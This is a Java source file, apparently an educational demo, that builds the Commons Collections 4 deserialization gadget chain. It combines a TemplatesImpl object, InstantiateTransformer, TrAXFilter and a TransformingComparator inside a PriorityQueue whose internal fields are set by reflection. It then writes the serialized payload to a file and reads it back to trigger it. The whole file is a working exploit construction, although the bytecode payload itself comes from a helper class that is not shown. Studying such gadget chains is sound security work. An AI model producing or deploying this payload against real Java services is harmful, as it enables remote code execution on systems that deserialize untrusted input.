package edu.demo.MyCC4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import edu.demo.makeTemplates.MakeTemplates;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

//Actually, U don't need makeChain to make CC4-Gadget，so I made improvements to it
public class MyAnotherCC4 {

    public static void main(String[] args) throws Exception{
        //get templatesChian
        MakeTemplates makeTemplates = new MakeTemplates();
        Templates templates = (Templates) makeTemplates.makeTemplate();

        //make InstantiateTransformer
        InstantiateTransformer iTransfomer = new InstantiateTransformer(
                new Class[]{Templates.class}, new Object[]{templates});

        //make comparator
        TransformingComparator comparator = (TransformingComparator) MyAnotherCC4.makeComparator(iTransfomer);
        //test comparator
        //comparator.compare(1,2);

        //make priorityQueue
        PriorityQueue priorityQueue = (PriorityQueue) MyAnotherCC4.makePriorityQueue(comparator, TrAXFilter.class);
        //test ser
        MyAnotherCC4.testSer(priorityQueue);

    }

    public static Object makeComparator(Transformer transformer){
        return new TransformingComparator(transformer);
    }

    public static Object makePriorityQueue(Comparator comparator, Object TrAXFilter) throws Exception{
        PriorityQueue priorityQueue = new PriorityQueue(1,comparator);//initialxxx must >= 1
        //set queue[0] to be TemplateImplChain && size==2
        Class clz = priorityQueue.getClass();
        Field field = clz.getDeclaredField("queue");
        field.setAccessible(true);
        field.set(priorityQueue, new Object[]{TrAXFilter,"bar"});
        field = clz.getDeclaredField("size");//set the size to be 2,after the new PriorityQueue the size is still 0
        field.setAccessible(true);
        field.set(priorityQueue, 2);
        return  priorityQueue;
    }

    public static void testSer(Object payload) throws Exception{
        //ser
        FileOutputStream file = new FileOutputStream("Babe.bin");//(Taylor's Version)
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(payload);
        se.close();
        //deser
        FileInputStream file1 = new FileInputStream("Babe.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        unse.readObject();
        unse.close();
    }
}
